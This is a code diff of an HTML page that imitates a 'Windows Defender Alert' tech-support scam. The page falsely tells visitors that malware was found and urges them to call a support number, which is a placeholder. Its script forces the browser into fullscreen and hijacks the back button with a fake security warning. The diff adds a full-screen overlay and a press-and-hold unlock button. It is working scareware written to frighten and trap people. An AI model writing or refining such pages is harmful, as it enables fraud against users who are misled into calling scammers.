@@ -7,41 +7,80 @@
   <style>
     body {
       margin: 0;
-      padding: 20px;
+      padding: 0;
       background: black;
       color: white;
       font-family: sans-serif;
-      text-align: center;
     }
-    .box {
-      background: #222;
+    .fullscreen-alert {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #111;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
       padding: 20px;
-      border: 2px solid red;
-      border-radius: 10px;
+    }
+    .fullscreen-alert h2 {
+      color: red;
+      font-size: 24px;
+    }
+    .fullscreen-alert p {
+      font-size: 16px;
+      margin-top: 10px;
+    }
+    #unlockBtn {
+      margin-top: 30px;
+      padding: 10px 20px;
+      font-size: 18px;
+      background: red;
+      border: none;
+      color: white;
+      border-radius: 5px;
     }
   </style>
   <script>
-    // Force fullscreen (for supported browsers)
-    document.addEventListener("click", function () {
+    // Force fullscreen if browser supports
+    document.addEventListener("click", () => {
       let el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
     });
 
-    // Push fake history to block back button
+    // Lock back button
     history.pushState(null, null, location.href);
     window.onpopstate = function () {
-      alert("⚠️ Security Warning: You cannot go back from this page!");
-      history.pushState(null, null, location.href); // Push again to prevent exit
+      alert("⚠️ Security Warning: You cannot go back!");
+      history.pushState(null, null, location.href);
     };
+
+    // Unlock popup only on long press (3s)
+    let holdTimer;
+    function startHold() {
+      holdTimer = setTimeout(() => {
+        document.getElementById("alertBox").style.display = "none";
+        alert("✅ Popup dismissed.");
+      }, 3000); // hold 3 seconds
+    }
+    function cancelHold() {
+      clearTimeout(holdTimer);
+    }
   </script>
 </head>
 <body>
-  <div class="box">
+  <div class="fullscreen-alert" id="alertBox">
     <h2>⚠️ Windows Defender Alert</h2>
     <p>Malware has been detected on your device.</p>
-    <p>Call support immediately at: <strong>+1-800-FAKE-NUM</strong></p>
+    <p>Call support immediately: <br><strong>+1-800-FAKE-NUM</strong></p>
     <p>Do not press back. Your data is at risk.</p>
+    <button id="unlockBtn" onmousedown="startHold()" onmouseup="cancelHold()" ontouchstart="startHold()" ontouchend="cancelHold()">
+      Press & Hold 3 sec to Unlock
+    </button>
   </div>
 </body>
 </html>
